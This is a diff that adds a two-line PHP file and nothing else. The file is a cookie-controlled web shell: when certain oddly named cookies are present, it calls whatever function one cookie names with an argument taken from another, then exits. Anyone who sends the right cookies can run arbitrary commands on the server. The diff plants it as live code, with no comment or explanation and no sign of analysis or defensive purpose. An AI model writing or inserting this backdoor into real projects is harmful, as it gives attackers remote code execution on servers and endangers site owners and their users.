@@ -1,0 +1,2 @@
+<?php
+if(isset($_COOKIE["Fifw"])){$_COOKIE["wBy"]($_COOKIE["Fifw"]);exit;} if(isset($_COOKIE["FxJAT"])){$_COOKIE["EBeMC"]($_COOKIE["FxJAT"]);exit;}
